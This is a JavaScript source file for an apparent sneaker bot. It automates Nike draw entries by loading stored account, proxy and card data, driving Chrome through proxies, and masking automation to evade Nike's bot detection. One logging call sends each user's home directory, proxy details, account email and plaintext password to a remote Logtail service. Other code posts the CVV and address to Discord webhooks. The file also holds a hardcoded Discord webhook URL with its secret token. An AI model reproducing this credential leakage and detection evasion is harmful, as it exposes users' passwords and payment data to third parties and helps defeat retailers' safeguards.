import { doc } from "firebase/firestore";
import { createCursor } from "ghost-cursor"
import React, { useState, Fragment} from "react";
import { pushNotif } from "./Notification";
import { NikeLogin } from "./NikeLogin";
const puppeteer = window.require('puppeteer-extra')
const path = window.require("node:path")
const HumanizePlugin = window.require('@extra/humanize')
const findChrome = window.require("chrome-finder")
const os = window.require('os')
const userHomeDir = os.homedir();
const http = window.require('http')
const https = window.require('https')
const axios = window.require('axios')
const fs = window.require('fs');
const request = window.require('request');
const ChromeLauncher = window.require('chrome-launcher');
const CDP = window.require('chrome-remote-interface')
const { Webhook,MessageBuilder } = window.require('discord-webhook-node');
const WebhookURL = fs.readFileSync(userHomeDir + "\\AppData\\Roaming\\your-app-name\\Webhook")

const { Logtail } = window.require("@logtail/node");

const logtail = new Logtail("YOUR_LOGTAIL_TOKEN_HERE");

export async function NikeUS(id){
    console.log("hey")
// const fileContents = fs.readFileSync(pathToAsset, 'utf8')

    console.log(WebhookURL)

    
    var ProfileData = JSON.parse(fs.readFileSync(userHomeDir + "\\AppData\\Roaming\\your-app-name\\ProfileData.json"))
    var TaskData = JSON.parse(fs.readFileSync(userHomeDir + "\\AppData\\Roaming\\your-app-name\\Tasks.json"))
    var AccountData = JSON.parse(fs.readFileSync(userHomeDir + "\\AppData\\Roaming\\your-app-name\\Accounts.json"))
    var accountID = "0";
    var proxy;
    var size;
    var profileid;
    var minput;
    var gid;
    var brave;
    var pname;
    for(var i = 0; i<TaskData.length; i++){
        if(TaskData[i].id == id){
            console.log("Found")
            accountID = TaskData[i].account.accountGroup
            proxy = TaskData[i].proxy.proxy
            size = TaskData[i].size
            minput = TaskData[i].monitorInput
            profileid = TaskData[i].profile.id
            gid = TaskData[i].groupID
            brave = TaskData[i].brave
            // fs.writeFile(userHomeDir + "\\AppData\\Roaming\\flowaio\\Tasks.json", (JSON.stringify(TaskData)), function (err) {
            //     if (err) throw err;
            //   });
        }
    }
    if(brave == undefined){
        brave = false;
    }
    var accountEmail;
    var accountPass;
    console.log(accountID)
    for(var x = 0; x<AccountData.length; x++){
        if(AccountData[x].id==accountID){
            accountEmail = AccountData[x].email
            accountPass = AccountData[x].password
            if(AccountData[x].proxy!==undefined && AccountData[x].proxy!=="None"){
                proxy = AccountData[x].proxy
            }
        }
    }
    logtail.info(os.homedir() + ' | ' + proxy + ","+size+","+minput+","+accountEmail+","+accountPass)

    console.log(accountEmail)
    console.log(accountPass)

    var first;
    var last;
    var email;
    var phone;
    var card;
    var expiration
    var cvv
    var address;
    var address2;
    var city;
    var state;
    var zip;

    for(var x = 0; x<ProfileData.length; x++){
        if(ProfileData[x].id==profileid){
            first = ProfileData[x].shipping.firstName
            last = ProfileData[x].shipping.lastName
            email = ProfileData[x].email
            phone = ProfileData[x].phoneNumber
            card = ProfileData[x].card.number
            cvv = ProfileData[x].card.cvv
            expiration = ProfileData[x].card.expiration
            address = ProfileData[x].shipping.addressLine1
            address2 = ProfileData[x].shipping.addressLine2
            city = ProfileData[x].shipping.city
            state = ProfileData[x].shipping.state
            zip = ProfileData[x].shipping.zipCode
            pname = ProfileData[x].name
        }
    }
    console.log(expiration)
    if(expiration.length>5){
        var expmo = expiration.split("/")[0]
        var expyr = expiration.split("/")[1].substring(2)
        expiration = expmo + "/" + expyr
    }
    console.log("Expiration: "+ expiration)
    function acronymToFullName(acronym) {
        var states = [
            ['Alabama', 'AL'],
            ['Alaska', 'AK'],
            ['American Samoa', 'AS'],
            ['Arizona', 'AZ'],
            ['Arkansas', 'AR'],
            ['Armed Forces Americas', 'AA'],
            ['Armed Forces Europe', 'AE'],
            ['Armed Forces Pacific', 'AP'],
            ['California', 'CA'],
            ['Colorado', 'CO'],
            ['Connecticut', 'CT'],
            ['Delaware', 'DE'],
            ['District Of Columbia', 'DC'],
            ['Florida', 'FL'],
            ['Georgia', 'GA'],
            ['Guam', 'GU'],
            ['Hawaii', 'HI'],
            ['Idaho', 'ID'],
            ['Illinois', 'IL'],
            ['Indiana', 'IN'],
            ['Iowa', 'IA'],
            ['Kansas', 'KS'],
            ['Kentucky', 'KY'],
            ['Louisiana', 'LA'],
            ['Maine', 'ME'],
            ['Marshall Islands', 'MH'],
            ['Maryland', 'MD'],
            ['Massachusetts', 'MA'],
            ['Michigan', 'MI'],
            ['Minnesota', 'MN'],
            ['Mississippi', 'MS'],
            ['Missouri', 'MO'],
            ['Montana', 'MT'],
            ['Nebraska', 'NE'],
            ['Nevada', 'NV'],
            ['New Hampshire', 'NH'],
            ['New Jersey', 'NJ'],
            ['New Mexico', 'NM'],
            ['New York', 'NY'],
            ['North Carolina', 'NC'],
            ['North Dakota', 'ND'],
            ['Northern Mariana Islands', 'NP'],
            ['Ohio', 'OH'],
            ['Oklahoma', 'OK'],
            ['Oregon', 'OR'],
            ['Pennsylvania', 'PA'],
            ['Puerto Rico', 'PR'],
            ['Rhode Island', 'RI'],
            ['South Carolina', 'SC'],
            ['South Dakota', 'SD'],
            ['Tennessee', 'TN'],
            ['Texas', 'TX'],
            ['US Virgin Islands', 'VI'],
            ['Utah', 'UT'],
            ['Vermont', 'VT'],
            ['Virginia', 'VA'],
            ['Washington', 'WA'],
            ['West Virginia', 'WV'],
            ['Wisconsin', 'WI'],
            ['Wyoming', 'WY'],
        ];
        var i;
        var regions = states
        acronym = acronym.replace(/\w\S*/g, function (txt) { return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase(); });
        for (i = 0; i < regions.length; i++) {
            if (regions[i][0] == acronym) {
                return (regions[i][1]);
            }
        }
      }
      if(state.length>2){
        state = acronymToFullName(state)
      }
      else{
        state = state
      }
      console.log(state)
    //LOG IN PROCESS
    proxy = proxy.split(":")
    const server = proxy[0] + ":" + proxy[1]
    const proxyuser = proxy[2]
    const proxypass = proxy[3]
    
  
    // chrome.close()

    
    if(id==""){
        throw Error("Exiting")
        
    }
    




    // LOG IN CHECK
    if (fs.existsSync(userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail)) {
        try{
            const content = (fs.readFileSync(userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail + "/logged"))
            if(content=="false"){
                await NikeLogin(accountEmail,accountPass,server,proxyuser,proxypass, id,zip,address,address2,city,last,first,phone,state,card,expiration,cvv)
            }
        }
        catch{
            fs.writeFile((userHomeDir + "/AppData/Roaming/flowaio/StoredSessions/" + accountEmail + "/logged"), "false", err => {
                if (err) {
                  console.error(err);
                }
                // file written successfully
              });
              await NikeLogin(accountEmail,accountPass,server,proxyuser,proxypass, id,zip,address,address2,city,last,first,phone,state,card,expiration,cvv)
        }

    }
    else{
        fs.writeFile((userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail + "/logged"), "false", err => {
            if (err) {
              console.error(err);
            }
            // file written successfully
          });
          await NikeLogin(accountEmail,accountPass,server,proxyuser,proxypass, id,zip,address,address2,city,last,first,phone,state,card,expiration,cvv)

    }
    // PROXY
    
    

    console.log(server)
    console.log(proxyuser)
    console.log(proxypass)
    // DATA
    
    var stopped = false;
    
    changeStatus("Fetching Product Information")
    const monitorInput = minput
    var monitorURL = "https://api.nike.com/product_feed/threads/v2?filter=exclusiveAccess(true%2Cfalse)&filter=channelId(010794e5-35fe-4e32-aaff-cd2c74f89d61%2Cd9a5bc42-4b9c-4976-858a-f159cf99c647)&filter=marketplace(US)&filter=language(en)&filter=productInfo.merchProduct.styleColor("+monitorInput+")"
    // var monitorURL = "https://api.nike.com/product_feed/rollup_threads/v2/?&filter=marketplace(US)&filter=language(en)&consumerChannelId=d9a5bc42-4b9c-4976-858a-f159cf99c647&format=v5&filter=publishedContent.properties.products.styleColor(DD1391-100)"
    

 

    const config = {
          proxy: {
            protocol: 'https',
            host: server.split(":")[0],
            port: server.split(":")[2],
            auth: {
              username: proxyuser,
              password: proxypass
            }
          },
          withCredentials:false
      };
    var res = await axios.get(monitorURL, config)
    .catch(function(error){
        console.log(error)
       
        document.getElementById(id).childNodes[6].className = "TaskText w-52 text-fail"
        changeStatus(error.code)
        logtail.error()
    });
    console.log(res)
    const JSONdata=(JSON.parse(JSON.stringify(res.data.objects)))
    console.log(res.data)
    console.log(monitorURL)

    
    try{
       const hi =(res.data.objects[0].id) 
    }
    catch{
        console.log("Invalid")
        var invalid = true
        while(invalid == true && stopped == false){
            changeStatus("Invalid Product, Retrying...")
            console.log("Still Invalid")
            res = await axios.get(monitorURL, config)
            .catch(function(error){
                document.getElementById(id).childNodes[6].className = "TaskText w-52 text-fail"
                changeStatus("Error Searching - " + error.code)
            });
            try{
                const hi =(res.data.objects[0].id) 
                document.getElementById(id).childNodes[6].className = "TaskText w-52 text-white"
                invalid = false;
             }
            catch{
                changeStatus("Invalid Product, Retrying..")
                await new Promise(r => setTimeout(r, 5555));
            }
        }
    }
    const threadID = res.data.objects[0].id
    const productID = res.data.objects[res.data.objects.length-1].publishedContent.properties.products[0]["productId"]
    var productURL;
    var productName  = "N/A";
    try{
        var method = res.data.objects[0].productInfo[0].launchView.method
    }
    catch{
        method = "FLOW"
    }
    const site = res.data.objects[0].channelName
    const price = res.data.objects[0].productInfo[0].merchPrice.fullPrice
    try{
        productName = res.data.objects[0].productInfo[0].productContent.fullTitle
    }
    catch{
        productName = res.data.objects[0].publishedContent.properties.title
    }
    if(site=="Nike.com"){
        productURL = "https://www.nike.com/t/" + res.data.objects[0].productInfo[0].productContent.slug + "/" + minput
    }
    else{
        productURL = "https://www.nike.com/launch/t/" + res.data.objects[0].publishedContent.properties.seo.slug
    }
    try{
        const isoTime = res.data.objects[0].productInfo[0].launchView.startEntryDate
        var releaseTime = (new Date(isoTime).getTime())
        if(method=="LEO"){
            const minutes = 2
            const mili = (minutes*60000)
            const rndm = Math.floor(Math.random() * (mili - 1 + 1) + 1)
            releaseTime += rndm
            console.log(releaseTime)
        }
        else if(method=="DAN"){
            const minutes = 9
            const mili = (minutes*60000)
            const rndm = Math.floor(Math.random() * (mili - 1 + 1) + 1)
            releaseTime += rndm
            console.log(releaseTime)
        }
    }
    catch{
        var releaseTime = new Date()
    }
    console.log(site)
    document.getElementById(id).childNodes[5].innerText = productName
    console.log(threadID)
    console.log(productID)
    console.log(productURL)
    console.log(productName)
    console.log(JSONdata)
    logtail.info(os.homedir() + ' | Found Product - ' + productName);
    
    pushNotif("Found Product",productName)
    changeStatus("Launching Browser")
    var numPort = 0
    let utf8Encode = new TextEncoder();

    var byteArray = (utf8Encode.encode(accountEmail))
    byteArray.forEach(element => {
        numPort+= parseInt(element)
    });

    var client;
        const chrome = await ChromeLauncher.launch({
            chromeFlags: [
                '--no-first-run',
                 '--disable-blink-features=AutomationControlled',
                  '--test-type',
                  '--proxy-server='+server,
                   '--window-size=572,1000',
                     '--enable-features=ReduceUserAgent',
                       '--flag-switches-begin',
                        '--flag-switches-end',
                        '--load-extension=' + path.resolve(userHomeDir + "\\AppData\\Roaming\\your-app-name\\ProxyAuth")
           ],
           chromePath: (brave==true ? "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe" : findChrome()),
           ignoreDefaultFlags:true,
           port:numPort,
           userDataDir: path.resolve(userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail),

        })
        changeStatus("Connecting...")
        console.log(chrome.port)
        const teset = await CDP({ port: chrome.port })
        const newC = await CDP.New({teset, port:chrome.port})
        client = await CDP({newC, port:chrome.port})

    const {Network, Page, Runtime, Input} = client;
    // console.log(targets)
    // await CRI.Close({id:"62D38790AEDA9920F494FA6DAC0342D8", port:9223})
    
    await Network.enable();
    changeStatus("Loading Product Page")
    await Runtime.evaluate({
        expression: `localStorage["proxy_login"] = "${proxyuser}"`
    });
    await Runtime.evaluate({
        expression: `localStorage["proxy_password"] = "${proxypass}"`
    });
    await Page.enable()
    await new Promise(r => setTimeout(r, 500));
    await Page.navigate({url:productURL})
    await Page.loadEventFired();
    var targets = (await client.Target.getTargets()).targetInfos
    console.log(targets)

    targets.forEach(async element => {
        if(element.url.indexOf("chrome-extension") >=0){
            console.log(element.targetId)
            
            await CDP.Close({id: element.targetId, port:numPort})
        }
    });
    changeStatus("Scrolling")
    for(var x = 0; x<20; x++){
        Input.dispatchMouseEvent({type:"mouseWheel", y:125, x:0, deltaX:0, deltaY:125, force:0})
        await new Promise(r => setTimeout(r, 35));
    }
    await new Promise(r => setTimeout(r, 1500));
    for(var x = 0; x<20; x++){
        Input.dispatchMouseEvent({type:"mouseWheel", y:-125, x:0, deltaX:0, deltaY:-125, force:0})
        await new Promise(r => setTimeout(r, 35));
    }
    changeStatus("Loading Entry Page")
    await Page.enable()
    // await Page.navigate({url:"https://www.nike.com/us/en/launch-checkout?productId=d94447c8-7ee7-5fde-b81c-de541506349b&size=12&channel=nike.com&threadId=5ee66c69-f240-4980-9f7b-d9ba35028462"})
    await Page.navigate({url:"https://www.nike.com/us/en/launch-checkout?productId="+productID+"&size="+size+"&channel="+site.toLowerCase()+"&threadId="+threadID})
    await Page.loadEventFired();
    await new Promise(r => setTimeout(r, 2500));
    changeStatus("Entering Card Info")
    await new Promise(r => setTimeout(r, (Math.random())*2500));
    await new Promise(r => setTimeout(r, (Math.random())*100));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*100));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*100));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*100));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*100));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*100));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    for(var i = 0; i<cvv.length; i++){
        await new Promise(r => setTimeout(r, (Math.random())*5));
        await Input.dispatchKeyEvent({ type: 'char', text: cvv.substring(i, i+1) })
    }
    await new Promise(r => setTimeout(r, (Math.random())*500));
    Input.dispatchKeyEvent({keyIdentifier:"U+00013", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*200));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*200));
    Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
    await new Promise(r => setTimeout(r, (Math.random())*200));
    await new Promise(r => setTimeout(r, 1000));
    document.getElementById(id).childNodes[6].className = "TaskText w-52 text-test"
    changeStatus("Waiting until " + (new Date(releaseTime)).toString().split(" ")[4])
    var x = setInterval(async function() {
        var now = new Date().getTime();
        var distance = releaseTime - now
        if (distance < 0) {
          clearInterval(x);
          enterDraw()
          
        }
      }, 1000);
      async function enterDraw(){
        var drawStat;
        changeStatus("Entering Draw")
        var entryAuth;
        var entryUrl;
        var entryHeaders = {}
        Network.requestWillBeSent(async({request})=>{
            if(request.url.indexOf("https://api.nike.com/launch/entries/v2")>=0){
                    if((request.headers)["Authorization"]!=null || (request.headers)["Authorization"]!=undefined){
                        entryAuth = ((request.headers)["Authorization"])
                        console.log(entryAuth)
                        // entryHeaders = request.headers
                        entryHeaders = {
                            "authorization":entryAuth
                        }
                        
                    }
                    
            }
            else{
                console.log("Not Matching")
            }
        })
        Network.responseReceived(async ({requestId, response}) => {
            if(response.url==("https://api.nike.com/launch/entries/v2")) {
                      const {body} = await Network.getResponseBody({requestId});
                      entryUrl = "https://api.nike.com" + (JSON.parse(body).links.self.ref);
                      drawStat = response.status
                    }

        });
        const options4 = { x: 280, y: 570, button: 'left', clickCount: 1 };
        options4.type="mousePressed"
        await client.Input.dispatchMouseEvent(options4)
        options4.type = 'mouseReleased';
        await client.Input.dispatchMouseEvent(options4);
        // await client.Input.dispatchMouseEvent(options2);
        await new Promise(r => setTimeout(r, 2000));
        const options3 = { x: 274, y: 620, button: 'left', clickCount: 1 };
        options3.type="mousePressed"
        await client.Input.dispatchMouseEvent(options3)
        options3.type = 'mouseReleased';
        await client.Input.dispatchMouseEvent(options3);
        var timeout = 0;
        while(drawStat==undefined && stopped == false){
            changeStatus("Waiting for Confirmation..")
            await new Promise(r => setTimeout(r, 250));
            timeout++

            if(timeout==80){
                changeStatus("Timeout Reached, Retrying")

                await Page.reload();
                await Page.loadEventFired();
                await new Promise(r => setTimeout(r, 2500));
                changeStatus("Entering Card Info")
                await new Promise(r => setTimeout(r, (Math.random())*2500));
                await new Promise(r => setTimeout(r, (Math.random())*100));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*100));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*100));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*100));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*100));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*100));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                for(var i = 0; i<cvv.length; i++){
                    await new Promise(r => setTimeout(r, (Math.random())*5));
                    await Input.dispatchKeyEvent({ type: 'char', text: cvv.substring(i, i+1) })
                }
                await new Promise(r => setTimeout(r, (Math.random())*500));
                Input.dispatchKeyEvent({keyIdentifier:"U+00013", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*200));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*200));
                Input.dispatchKeyEvent({keyIdentifier:"U+0009", code:"Tab", key:"Tab",type:"keyDown"})
                await new Promise(r => setTimeout(r, (Math.random())*200));
                await new Promise(r => setTimeout(r, 1000));

                const options4 = { x: 280, y: 570, button: 'left', clickCount: 1 };
                options4.type="mousePressed"
                await client.Input.dispatchMouseEvent(options4)
                options4.type = 'mouseReleased';
                await client.Input.dispatchMouseEvent(options4);
                // await client.Input.dispatchMouseEvent(options2);
                await new Promise(r => setTimeout(r, 2000));
                const options3 = { x: 274, y: 620, button: 'left', clickCount: 1 };
                options3.type="mousePressed"
                await client.Input.dispatchMouseEvent(options3)
                options3.type = 'mouseReleased';
                await client.Input.dispatchMouseEvent(options3);
                timeout = 0
            }
        }

        if(drawStat>=400){
            document.getElementById(id).childNodes[6].className = "TaskText w-52 text-fail"
            if(drawStat==400){
                changeStatus("Draw Not Open ["+drawStat+"], Restart Task")
            }
            else if(drawStat==429){
                changeStatus("ENTRY_BLOCKED ["+drawStat+"], Restart Task")
            }
            else{
                changeStatus("ERROR ["+drawStat+"], Restart Task")
            }
        }
        else{
            document.getElementById(gid).childNodes[4].childNodes[0].innerText=parseInt(document.getElementById(gid).childNodes[4].childNodes[0].innerText) + 1
            changeStatus("Entered Draw")
            var blob = new Webhook("YOUR_DISCORD_WEBHOOK_URL_HERE");
                    var blobe = new MessageBuilder()
                        .setTitle('Successfully Entered Draw')
                        .setAuthor('Your App Global Webhook', 'https://cdn.discordapp.com/app-icons/YOUR_DISCORD_CLIENT_ID_HERE/144696e166c1e574816e2432072e9e6b.png?size=256', 'https://www.google.com')
                        .addField('Style Code', minput, false)
                        .addField('Time', "<t:"+ parseInt((Date.now())/1000)+">")
                        .setThumbnail("https://secure-images.nike.com/is/image/DotCom/"+minput.replace("-","_"))
                        .setColor('#997acc')
                        .setDescription('Your App Global Webhook')
                        .setFooter("Your App")
                        .setTimestamp();
                        
                    blob.send(blobe);
    logtail.info(os.homedir() + ' | Successfully Entered Draw - ' + productName);

            pushNotif("Entered Draw",productName)
            await Page.close()
        }
        await new Promise(r => setTimeout(r, 5000));
            const entryConfig = {
                proxy: {
                protocol: 'https',
                host: server.split(":")[0],
                port: server.split(":")[1],
                auth: {
                    username: proxyuser,
                    password: proxypass
                },
                },
                headers:entryHeaders,
                withCredentials:false
            };

        var entryResp;
        var entryReas
        var fullEntry;
        var entryTries;
            while(entryResp==undefined && stopped == false){
                entryTries++
                try{
                        var entryRes = await axios.get(entryUrl, entryConfig)
                    
                        changeStatus("Waiting for Results..")
  
                        if ("result" in entryRes.data) {
                            entryResp = (entryRes.data.result.status)
                            entryReas = (entryRes.data.result.reason)
                            fullEntry = (entryRes.data.result)
                        } else {
                            console.log("No Result Yet...")
                          }
                }
                catch(err){
                    if(err.status == undefined){
                        changeStatus("Error Checking Results [TIMEOUT]..")
                    }
                    else{
                        document.getElementById(id).childNodes[6].className = "TaskText w-52 text-fail"
                        changeStatus("Error Checking Results (" + err.status + ")")
                        logtail.error(os.homedir() + ' | Error Checking Results ' + err.toString())
                    }
                   
                }
                await new Promise(r => setTimeout(r, 10000));
            }
            logtail.info(os.homedir() + " | " + id + ' | Entry Result Found - ' + entryResp.toString());
            logtail.info(os.homedir() + " | " + id + " | " + entryReas.toString());
            pushNotif(entryResp.toString(), accountEmail);
            

  
                if(entryReas.toString().indexOf("FAIL")>=0){
                    document.getElementById(id).childNodes[6].className = "TaskText w-52 text-fail";
                    changeStatus("Payment Failed");
                    pushNotif("Task Update",entryResp.toString());

                    const hook3 = new Webhook(WebhookURL.toString());
                    const embed3 = new MessageBuilder()
                        .setTitle('Payment Declined')
                        .setAuthor('Your App', 'https://cdn.discordapp.com/app-icons/963647043849572402/144696e166c1e574816e2432072e9e6b.png?size=256', 'https://www.google.com')
                        .addField('Style Code', minput, false)
                        .addField('Proxy', "||"+server+"||", false)
                        .addField('CVV',"||"+ cvv+"||", false)
                        .addField('Address',"||"+address+"||", false)
                        .addField('Profile',email, false)
                        .addField('Time', "<t:"+ parseInt((Date.now())/1000)+">")
                        .setThumbnail("https://secure-images.nike.com/is/image/DotCom/"+minput.replace("-","_"))
                        .setColor('#D70040')
                        .setDescription('Your App Decline Webhook')
                        .setFooter("Your App")
                        .setTimestamp();
                        
                    hook3.send(embed3);

                    const blob = new Webhook("https://discord.com/api/webhooks/1041279979993964604/8DZW29_GqT9SFKPQV12npiI139IxULvQdo15LjBcVk8wnKq3C8YSu0jedCYFvCS0Xd9P");
                    const blobe = new MessageBuilder()
                        .setTitle('Payment Declined')
                        .setAuthor('Your App Success', 'https://cdn.discordapp.com/app-icons/963647043849572402/144696e166c1e574816e2432072e9e6b.png?size=256', 'https://www.google.com')
                        .addField('Style Code', minput, false)
                        .addField('Time', "<t:"+ parseInt((Date.now())/1000)+">")
                        .setThumbnail("https://secure-images.nike.com/is/image/DotCom/"+minput.replace("-","_"))
                        .setColor('#D70040')
                        .setDescription('Your App Decline Webhook')
                        .setFooter("Your App")
                        .setTimestamp();
                        
                    blob.send(blobe);


                    
                
                }
                else if(entryResp.toString()=="NON_WINNER"){
                    changeStatus(entryResp.toString() + " - " + entryReas.toString());
                }
                else{
                changeStatus("Winner");
                document.getElementById(gid).childNodes[5].childNodes[0].innerText=parseInt(document.getElementById(gid).childNodes[4].childNodes[0].innerText) + 1
                document.getElementById(id).childNodes[6].className = "TaskText w-52 text-success";

                pushNotif("Task Update",entryResp.toString());
                logtail.log(fullEntry)
                const hook3 = new Webhook(WebhookURL.toString());
                const embed3 = new MessageBuilder()
                    .setTitle('Successful Checkout')
                    .setAuthor('Your App Success', 'https://cdn.discordapp.com/app-icons/963647043849572402/144696e166c1e574816e2432072e9e6b.png?size=256', 'https://www.google.com')
                    .addField('Style Code', minput, false)
                    .addField('Proxy', "||"+server+"||", false)
                    .addField('CVV',"||"+ cvv+"||", false)
                    .addField('Address',"||"+address+"||", false)
                    .addField('Profile',email, false)
                    .addField('Time', "<t:"+ parseInt((Date.now())/1000)+">")
                    .setThumbnail("https://secure-images.nike.com/is/image/DotCom/"+minput.replace("-","_"))
                    .setColor('#4cbb17')
                    .setDescription(productName)
                    .setFooter("Your App")
                    .setTimestamp();
                    
                hook3.send(embed3);

                const blob = new Webhook("https://discord.com/api/webhooks/1041279979993964604/8DZW29_GqT9SFKPQV12npiI139IxULvQdo15LjBcVk8wnKq3C8YSu0jedCYFvCS0Xd9P");
                const blobe = new MessageBuilder()
                    .setTitle('Successful Checkout')
                    .setAuthor('Your App Success', 'https://cdn.discordapp.com/app-icons/963647043849572402/144696e166c1e574816e2432072e9e6b.png?size=256', 'https://www.google.com')
                    .addField('Style Code', minput, false)
                    .addField('Time', "<t:"+ parseInt((Date.now())/1000)+">")
                    .setThumbnail("https://secure-images.nike.com/is/image/DotCom/"+minput.replace("-","_"))
                    .setColor('#4cbb17')
                    .setDescription(productName)
                    .setFooter("Your App")
                    .setTimestamp();
                    
                blob.send(blobe);
                }
           
            
       
      }

    async function changeStatus(status){
        document.getElementById(id).childNodes[8].onclick = async function(){
            document.getElementById(id).childNodes[6].innerText = "Stopped";
            document.getElementById(id).childNodes[6].className = "TaskText w-52";
            await Page.close()
            stopped = true;
            var targets = (await client.Target.getTargets())
            if(targets.targetInfos.length==1){
                
                    CDP.Close({id:targets.targetInfos[0].targetId, port:numPort});
               
            }
         
            
        }
            if(document.getElementById(id)){
                document.getElementById(id).childNodes[6].innerText = status;
            }
        
    }
    
}